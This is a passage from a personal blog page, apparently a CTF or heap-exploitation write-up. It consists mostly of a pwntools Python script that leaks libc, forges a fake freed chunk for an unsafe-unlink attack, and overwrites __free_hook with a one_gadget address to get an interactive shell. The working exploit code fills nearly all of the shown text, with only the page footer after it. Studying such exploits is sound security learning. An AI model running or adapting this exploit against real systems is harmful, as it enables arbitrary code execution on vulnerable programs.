<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index: "</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>


<span class="nb">print</span><span class="p">(</span><span class="s2">"Forge fake freed chunk"</span><span class="p">)</span>
<span class="n">header_size</span> <span class="o">=</span> <span class="mh">0x10</span>
<span class="n">pointer_size</span> <span class="o">=</span> <span class="mh">0x8</span>

<span class="n">fw_pointer_offset</span> <span class="o">=</span> <span class="mh">0x10</span> 
<span class="n">bk_pointer_offset</span> <span class="o">=</span> <span class="mh">0x18</span>

<span class="n">fw_pointer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="n">bk_pointer_offset</span> <span class="c1"># bk_pointer_offset is needed to make the address stored in the m_array be overlapped to the position where the malloc expects the bk_pointer to be present when evaluating fw-&gt;bk</span>
<span class="n">bk_pointer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="n">fw_pointer_offset</span> <span class="c1"># fw_pointer_offset is needed to make the address stored in the m_array be overlapped to the position where malloc expects the fw_pointer to be present when evaluating bk-&gt;fw</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Forward Pointer : 0x</span><span class="si">{</span><span class="n">fw_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Backward Pointer : 0x</span><span class="si">{</span><span class="n">bk_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">fake_chunk_header</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">chunk_A_data</span> <span class="o">=</span> <span class="n">fake_chunk_header</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fw_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span>
<span class="n">chunk_A_junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x88</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_A_data</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> 

<span class="n">fake_prev_size_field</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">fake_prev_inuse_flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Overlow to chunk B header"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="n">chunk_A_data</span> <span class="o">+</span> <span class="n">chunk_A_junk</span> <span class="o">+</span> <span class="n">fake_prev_size_field</span> <span class="o">+</span> <span class="n">fake_prev_inuse_flag</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Force chunk A consolidation by freeing B"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"First overwrite the m_array user_data pointer with the target address"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="n">bk_pointer_offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__free_hook</span><span class="p">))</span>

<span class="n">gadget_offset</span> <span class="o">=</span> <span class="mh">0xe1fa1</span> <span class="c1"># Found with one_gadget tool</span>
<span class="n">gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">gadget_offset</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Then overwrite the target content"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>


<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>